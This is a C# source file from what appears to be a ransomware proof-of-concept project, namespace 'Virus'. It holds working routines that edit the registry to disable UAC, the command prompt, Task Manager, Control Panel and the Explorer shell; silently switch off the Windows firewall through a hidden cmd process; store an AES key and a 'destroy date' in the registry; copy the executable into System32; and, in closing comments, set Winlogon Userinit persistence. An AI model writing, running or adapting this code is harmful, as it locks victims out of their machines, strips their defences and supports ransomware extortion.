using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace Virus
{
    class RegHelpers
    {
        public static void LimitUserAccess()
        {
            DisableWindowsDefender();   //WORKING
            DisableWallpaper();
            DisableFileExplorer();
            DisableUAC();
            DisableCMD();
            DisableTaskMgr();
            DisableControlPanel();


        }
        public static void RemoveLimitedAccess()
        {
            EnableWindowsDefender();
            EnableUAC();
            EnableCMD();
            EnableTaskMgr();
            EnableControlPanel();
            DeleteDestroyDate();
            EnableFileExplorer();
        }

        private static void DisableUAC(bool reset = false)   //user account control 
        {
            RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            if (reset)
            {
                reg2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
            }
            else
            {
                reg2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            }
            reg2.Close();
        }
        private static void DisableCMD(bool reset = false)
        {
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            if (reset && reg2.GetValue("DisableCMD") != null)
            {
                reg2.DeleteValue("DisableCMD");
            }
            else
            {
                reg2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }
            reg2.Close();
        }
        private static void DisableTaskMgr(bool reset = false)
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");

            if (reset && reg.GetValue("DisableTaskMgr") != null)
            {
                reg.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
            }
            else
            {
                reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            }
            reg.Close();
        }
        private static void DisableControlPanel(bool reset = false)
        {
            RegistryKey reg1 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            if (reset)
            {
                reg1.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
            }
            else
            {
                reg1.SetValue("NoCtrlDisp", 1, RegistryValueKind.DWord);
                reg1.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
            }
            reg1.Close();
        }
        private static bool DisableWallpaper()
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");

            if (reg.GetValue("Wallpaper").ToString() != "")
            {
                reg.SetValue("Wallpaper", "", RegistryValueKind.String);
            }
            else { return false; }
            reg.Close();
            return true;
        }
        private static bool DisableFileExplorer()
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            if (reg.GetValue("Shell").ToString() != "")
            {
                reg.SetValue("Shell", "", RegistryValueKind.String);
            }
            else { return false; }
            reg.Close();
            return true;
        }

        private static void EnableCMD()
        {
            DisableCMD(true);

        }
        private static void EnableTaskMgr()
        {
            DisableTaskMgr(true);
        }
        private static void EnableControlPanel()
        {
            DisableControlPanel(true);
        }
        private static void EnableUAC()
        {
            DisableUAC(true);
        }
        private static bool EnableFileExplorer()
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            if (reg.GetValue("Shell").ToString() == "")
            {
                reg.SetValue("Shell", "Explorer.exe", RegistryValueKind.String);
            }
            else { return false; }
            reg.Close();
            return true;
        }

        public static bool SetDestroyDate(DateTime ddate)
        {
            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            string AppPath = Application.ExecutablePath;
            string AppVersion = "1.0";
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key.CreateSubKey(AppTitle);
            key = key.OpenSubKey(AppTitle, true);


            key.CreateSubKey(AppVersion);
            key = key.OpenSubKey(AppVersion, true);

            key.SetValue("exp", ddate);
            key.Close();
            return true;

        }
        public static string GetDestroyDate()
        {

            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            string AppPath = Application.ExecutablePath;
            string AppVersion = "1.0";
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key.CreateSubKey(AppTitle);
            var key1 = key.OpenSubKey(AppTitle, true); //open

            key1.CreateSubKey(AppVersion);   //open

            var key2 = key1.OpenSubKey(AppVersion, true);

            key.Close();
            key1.Close();

            var x = key2.GetValue("exp");
            if (x != null)
            {
                key2.Close();
                return x.ToString();
            }
            return null;

        }
        public static bool DeleteDestroyDate()
        {
            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            string AppPath = Application.ExecutablePath;
            string AppVersion = "1.0";
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key.CreateSubKey(AppTitle);
            var key1 = key.OpenSubKey(AppTitle, true); //open

            key1.CreateSubKey(AppVersion);   //open

            var key2 = key1.OpenSubKey(AppVersion, true);

            key.Close();
            key1.Close();

            var x = key2.GetValue("exp");
            if (x != null)
            {
                key2.DeleteValue("exp");
                key2.Close();
                return true;
            }
            return false;
        }

        public static bool SetAESkey(string toSave) //base64
        {
            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            string AppPath = Application.ExecutablePath;
            string AppVersion = "1.0";
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key.CreateSubKey(AppTitle);
            key = key.OpenSubKey(AppTitle, true);


            key.CreateSubKey(AppVersion);
            key = key.OpenSubKey(AppVersion, true);

            key.SetValue("aes", toSave);
            key.Close();
            return true;

        }
        public static string GetAESkey()
        {
            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            string AppPath = Application.ExecutablePath;
            string AppVersion = "1.0";
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key.CreateSubKey(AppTitle);
            var key1 = key.OpenSubKey(AppTitle, true); //open

            key1.CreateSubKey(AppVersion);   //open

            var key2 = key1.OpenSubKey(AppVersion, true);

            key.Close();
            key1.Close();

            var x = key2.GetValue("aes");

            if (x != null)
            {
                key2.Close();
                return x.ToString(); //gets encrypted key
            }
            return null;

        }
        public static bool DeleteAESkey()
        {
            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            string AppPath = Application.ExecutablePath;
            string AppVersion = "1.0";
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key.CreateSubKey(AppTitle);
            var key1 = key.OpenSubKey(AppTitle, true); //open

            key1.CreateSubKey(AppVersion);   //open

            var key2 = key1.OpenSubKey(AppVersion, true);

            key.Close();
            key1.Close();

            var x = key2.GetValue("aes");
            if (x != null)
            {
                key2.DeleteValue("aes");
                key2.Close();
                return true;
            }
            return false;
        }

        public static bool IsAvailableForAllUsers()
        {
            string pathStartUp = "C:\\Windows\\System32";
            if (!Directory.Exists(pathStartUp))
            {
                return false;
            }
            var exe = Assembly.GetExecutingAssembly().Location;
            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
            if (exe == destiny)
            {
                return true;
            }
            return false;
        }
        public static bool MakeAvailableForAllUsers()
        {
            string pathStartUp = "C:\\Windows\\System32";
            if (!Directory.Exists(pathStartUp))
            {
                File.Create(pathStartUp).Close();

            }
            var exe = Assembly.GetExecutingAssembly().Location;
            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
            if (exe != destiny)
            {
                var data = File.ReadAllBytes(exe);
                File.WriteAllBytes(destiny, data);
            }
            return true;



        }   //todo work on this

        private static void DisableWindowsDefender()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C NetSh Advfirewall set allprofiles state off";
            process.StartInfo = startInfo;
            process.Start();
        }
        private static void EnableWindowsDefender()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C NetSh Advfirewall set allprofiles state on";
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void AddToStartupReg()
        {
            
        }

        //reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Hello"
    }   //reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Users\Rory Cox\source\repos\CSharp-Ransomware-POC (Github)\Virus\bin\Debug\Virus.exe"
}
